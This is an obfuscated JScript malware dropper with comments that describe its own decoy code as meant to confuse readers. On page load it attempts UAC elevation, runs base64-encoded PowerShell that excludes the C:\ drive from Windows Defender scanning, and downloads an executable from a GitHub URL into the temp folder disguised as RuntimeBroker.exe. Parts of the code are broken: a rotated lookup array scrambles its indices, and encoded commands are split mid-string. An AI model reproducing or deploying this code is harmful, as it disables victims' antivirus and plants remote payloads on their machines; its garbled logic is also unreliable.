(function () {
    // Useless diversion variables
    var _0xX0 = ['Alpha','Beta','Gamma','Delta'];
    (function (_0xY1, _0xZ2) {
        var _0xa3 = function (_0xb4) {
            while (--_0xb4) {
                _0xY1.push(_0xY1.shift());
            }
        };
        _0xa3(++_0xZ2);
    }(_0xX0, 0x14));

    // Core lookup array used for code execution commands
    var _0xR5 = ['Named', 'Exists', 'ShellExecute', 'FullName', 'ScriptFullName', 'runas', 'Shell.Application', 'Wscript.Shell', 'run', 'powershell -enc '];
    (function (_0xA6, _0xB7) {
        var _0xC8 = function (_0xD9) {
            while (--_0xD9) {
                _0xA6.push(_0xA6.shift());
            }
        };
        _0xC8(++_0xB7);
    }(_0xR5, 0x1b5));
    var _0xE0 = function (_0xF1, _0xG2) {
        _0xF1 = _0xF1 - 0x0;
        return _0xR5[_0xF1];
    };

    // Dummy noise to confuse human readers
    var _0xNoise = (function () {
        var _0xN1 = 0;
        for (var _0xI2 = 0; _0xI2 < 5; _0xI2++) {
            _0xN1 += Math.pow(_0xI2, 2) - Math.sqrt(_0xI2);
        }
        return _0xN1;
    })();
    var _0xDummyArray = [_0xNoise, Date.now(), Math.random()];

    // Primary function for UAC elevation
    function _0xObf1() {
        if (!WScript[_0xE0('0x0')][_0xE0('0x1')]('elevate')) {
            // Create elevated process using ActiveXObject
            new ActiveXObject(_0xE0('0x6'))[_0xE0('0x2')](_0xE0('0x3'), '"' + WScript[_0xE0('0x4')] + '" /elevate', '', _0xE0('0x5'), 0x1);
            WScript['Quit']();
        }
    }
    
    // Extra decoy function to further obfuscate the flow
    function _0xDecoy() {
        var _0xI3 = 0;
        while (_0xI3 < 3) {
            _0xI3++;
            (function(){ return; })();
        }
    }
    
    // Initialize ActiveX shell object
    var _0xActiveX = new ActiveXObject(_0xE0('0x7'));

    // Function executing a sequence of encoded commands
    function _0xExecSequence() {
        _0xObf1();
        _0xDecoy();
        var _0xPayload = [
            "cABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACAALQBjAG8AbQBtAGEAbgBkACAAIgBBAGQAZAAtAE0AcABQAHIAZQBmAGUAcgBlAG4AYwBlACAALQBFAHgAYwBsAHUAcwBpAG8AbgBQAGEAdABoACAAIgBDADoAXAANAAoA",
            "cgBlAGcAIABhAGQAZAAgACIASABLAEwATQBcAFMATw==",
            "RWZcAFAAbwBsAGkAYwBpAGUAcwBcAE0AaQBjAHIAbwBzAG8AZgB0AFwAVwBpAG4AZABvAHcAcwAgAEQAZQBmAGUAbgBkAGUAcgBcAEUAeABjAGwAdQBzAGkAbwBuAHMAXABQAGEAdABoAHMAIgAgAC8AdgAgAEMAOgBcAA==",
            "JAB1AHIAbAAgAD0AIAAiAGgAdAB0AHAAcwA6AC8ALwBnAGkAdABoAHUAYgAuAGMAbwBtAC8AYgBsAG8AdwBkAGUAeQB0AG8AcAAvAHQAcwBwAG0AbwB0AHcAaQBuAC8AcgBhAHcALwByAGUAZgBzAC8AaABlAGEAZABzAC8AbQBhAGkAbgAvAEMAbABpAGUAbgB0AC0AYgB1AGkAbAB0AC4AZQB4AGUAIgANAAoAJABvAHUAdABwAHUAdAAgAD0AIAAiACQAZQBuAHYAOgBUAGUAbQBwAC8AUgB1AG4AdABpAG0AZQBCcgBvAGsAZQByAC4AZQB4AGUAIgANAAoASQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACQAdQByAGwAIAAtAE8AdQB0AEYAaQBsAGUAIAAkAG8AdQB0AHAAdQB0AA=="
        ];
        // Loop through the payload array and execute each command using the ActiveX shell object
        for (var _0xJ4 = 0x0; _0xJ4 < _0xPayload.length; _0xJ4++) {
            _0xActiveX[_0xE0('0x8')](_0xE0('0x9') + _0xPayload[_0xJ4], 0x0, !1);
        }
    }

    // Obfuscated alias function call for window onload event
    function _0xInit() {
        _0xExecSequence();
    }
    window['onload'] = _0xInit;
})();
